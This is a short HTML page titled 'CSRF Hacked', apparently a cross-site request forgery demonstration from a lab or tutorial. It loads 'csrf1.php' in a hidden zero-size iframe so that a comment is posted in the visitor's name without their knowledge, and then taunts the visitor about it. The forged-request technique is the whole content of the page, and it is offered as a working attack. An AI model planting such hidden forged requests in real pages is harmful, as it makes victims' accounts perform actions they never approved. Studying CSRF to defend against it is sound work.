<html>
<head>
	<title>CSRF Hacked</title>
</head>

</script>
<body>
 <center><h1>Welcome to this page</h1>
 <h2>A comment has been posted on your behalf. Go Bakc to see it :P</h2></center>

	<iframe src="csrf1.php" height=0 width=0>
	</iframe>
<a href="fb.php">Back</a>
</body>
</html>